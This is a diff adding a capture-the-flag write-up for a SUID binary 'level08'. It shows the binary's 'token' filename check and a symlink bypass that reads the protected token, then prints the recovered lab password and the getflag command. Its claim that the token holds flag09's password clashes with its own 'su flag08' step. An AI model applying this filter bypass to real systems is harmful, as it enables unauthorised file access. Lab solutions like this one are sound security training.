@@ -1,0 +1,26 @@
+`level08` has SUID bit set, it can be run as its owner `flag08`.
+`level08` takes a filename as argument and displays its content, but it checks if the filename contains the word `token`, if it does it exits.
+
+```
+pcVar1 = strstr((char *)in_stack_00000008[1],"token");
+if (pcVar1 != (char *)0x0) {
+	printf("You may not access \'%s\'\n",in_stack_00000008[1]);
+					/* WARNING: Subroutine does not return */
+	exit(1);
+}
+```
+
+to read	`token`, a symlink witha diferent name is created and passed as argument to `level08`
+
+```
+ln -s /home/user/level08/token /tmp/a
+./level08 /tmp/a
+```
+
+`token` contained `flag09`'s password: quif5eloekouj29ke0vouxean
+
+The following command outputs the flag
+
+```
+su -c getflag flag08
+```
